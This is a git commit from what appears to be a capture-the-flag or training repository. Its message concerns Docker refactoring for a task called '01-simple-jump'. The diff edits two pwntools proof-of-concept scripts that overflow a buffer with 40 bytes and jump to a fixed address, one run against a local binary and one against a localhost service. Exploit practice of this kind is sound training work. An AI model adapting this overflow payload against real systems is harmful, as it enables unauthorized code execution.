9f7c43326281695d2cb786bb65972161ebd90905
devopscoder331 <devopscoder331@gmail.com>
2025-04-02 22:02:26 +0300

    Рефакторинг Dockerfile, docker-compose для 01-simple-jump

--- tasks/01-simple-jump/poc/poc_local.py
+++ tasks/01-simple-jump/poc/poc_local.py
@@ -1,5 +1,6 @@
 from pwn import *
 
-p = process('./main')
-p.sendline(b'A'*40+p64(0x0000000000401156))
+p = process('../app/main')
+payload = b'A'*40+p64(0x0000000000401156)
+p.sendline(payload)
 p.interactive()
--- tasks/01-simple-jump/poc/poc_network.py
+++ tasks/01-simple-jump/poc/poc_network.py
@@ -1,5 +1,10 @@
 from pwn import *
 
+#context.log_level = 'debug' # debug mode
+
 p = remote('0.0.0.0', 9000)
-p.sendline(b'A'*40+p64(0x0000000000401156))
-p.interactive()
+payload = (b'A'*40+p64(0x0000000000401156))
+p.sendline(payload)
+#p.interactive()
+response = p.recvall() 
+print(response.decode())
